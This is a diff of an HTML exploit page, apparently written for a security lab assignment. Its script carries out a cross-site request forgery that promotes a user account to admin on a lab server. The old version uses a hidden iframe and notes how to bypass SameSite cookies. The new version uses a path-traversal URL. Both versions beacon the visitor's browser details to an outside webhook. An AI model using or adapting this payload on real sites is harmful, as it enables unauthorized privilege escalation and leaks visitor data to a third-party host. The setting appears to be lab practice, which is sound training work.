@@ -4,13 +4,10 @@
 <body>
 <script>
 var W = 'https://golden-sparrow-81.webhook.cool';
-var TARGET = 'https://10.20.18.55:2070/labs/assignment03/environment/1/api/users/20211381/promote';
-var qs = '?v3=1&ua=' + encodeURIComponent(navigator.userAgent);
-try { new Image().src = W + '/v3-loaded' + qs; } catch(e) {}
-// Chrome <50 ignores SameSite -> cookies attach even to cross-site iframes
-try { document.write('<iframe src="' + TARGET + '" style="width:10px;height:10px;border:0"></iframe>'); } catch(e) {}
-// top-level navigation fallback after the iframe has had its chance
-setTimeout(function(){ location.replace(TARGET); }, 1500);
+var T = 'https://10.20.18.55:2070/labs/assignment03/environment/1/?view=admin&request=x/../../users/20211381/promote';
+var qs = '?v4=1&ua=' + encodeURIComponent(navigator.userAgent);
+try { new Image().src = W + '/v4-loaded' + qs; } catch(e) {}
+setTimeout(function(){ location.replace(T); }, 800);
 </script>
 </body>
 </html>
